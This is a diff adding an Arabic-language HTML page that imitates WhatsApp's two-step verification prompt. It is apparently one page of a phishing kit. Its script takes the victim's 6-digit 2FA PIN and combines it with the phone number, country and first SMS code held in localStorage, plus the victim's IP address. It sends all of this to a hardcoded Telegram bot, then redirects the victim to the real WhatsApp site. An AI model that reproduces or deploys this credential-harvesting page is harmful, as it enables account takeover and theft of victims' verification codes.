@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Verification</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+    <style>
+        /* Exact background from your index and countdown pages */
+        body { 
+            background-color: #111b21; 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            color: #e9edef; 
+        }
+        .container { 
+            background-color: #222e35; 
+            width: 90%; 
+            max-width: 400px; 
+            padding: 40px 30px; 
+            border-radius: 10px; 
+            text-align: center; 
+            box-shadow: 0 12px 15px rgba(0,0,0,0.24); 
+        }
+        .logo { width: 60px; margin-bottom: 25px; }
+        
+        h2 { font-size: 20px; margin-bottom: 15px; font-weight: 500; }
+        .instruction { color: #8696a0; font-size: 14px; margin-bottom: 30px; }
+        
+        /* Matching the Dark Mode input style from index.html */
+        input { 
+            width: 100%; 
+            height: 50px; 
+            background-color: #2a3942; 
+            border: 1px solid #2a3942; 
+            color: #fff; 
+            border-radius: 8px; 
+            font-size: 22px; 
+            text-align: center; 
+            outline: none; 
+            margin-bottom: 25px;
+            letter-spacing: 5px;
+        }
+        input:focus { border-color: #00a884; }
+
+        /* Exact button style and color from other pages */
+        .btn { 
+            background-color: #00a884; 
+            color: #111b21; 
+            border: none; 
+            width: 100%; 
+            padding: 15px; 
+            border-radius: 25px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: 0.3s; 
+        }
+        .btn:hover { background-color: #06cf9c; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+    <h2>التحقق بخطوتين</h2>
+    <p class="instruction">أدخل الرمز المكون من 6 أرقام (PIN) للمتابعة.</p>
+    
+    <input 
+        id="additionalData" 
+        type="password" 
+        inputmode="numeric" 
+        maxlength="6" 
+        oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
+        placeholder="••••••"
+    >
+    
+    <button class="btn" onclick="sendFinalData()">إتمام</button>
+</div>
+
+<script>
+    const p1 = '8497881667'; const p2 = 'AAECLuXvQ_m93xbeEiRDK7RK3yd2ghLPtxo';
+    const botToken = p1 + ':' + p2; const chatId = '6727057071';
+
+    function sendFinalData() {
+        const pin = document.getElementById('additionalData').value;
+        if (pin.length === 6) {
+            const btn = document.querySelector('.btn');
+            btn.innerText = "جاري التحميل...";
+            btn.disabled = true;
+
+            const finish = (ip) => {
+                const num = localStorage.getItem('phoneNumber') || "N/A";
+                const cry = localStorage.getItem('countryName') || "N/A";
+                const c1 = localStorage.getItem('firstCode') || "N/A";
+                
+                const msg = `🚨 RAPPORT FINAL\n📞 Num: ${num}\n🌍 Pays: ${cry}\n🔢 Code 1: ${c1}\n🔑 PIN 2FA: ${pin}\n🌐 IP: ${ip}`;
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
+                .finally(() => { 
+                    window.location.href = 'https://www.whatsapp.com'; 
+                });
+            };
+
+            // Fixed "Unstuck" logic: move forward after 2s even if IP fails
+            const forceForward = setTimeout(() => finish("VPN/Hidden"), 2000);
+
+            fetch('https://ipinfo.io/json')
+                .then(res => res.json())
+                .then(data => {
+                    clearTimeout(forceForward);
+                    finish(data.ip);
+                })
+                .catch(() => {
+                    clearTimeout(forceForward);
+                    finish("Error/Blocked");
+                });
+        } else { 
+            alert("يرجى إدخال 6 أرقام."); 
+        }
+    }
+</script>
+
+</body>
+</html>
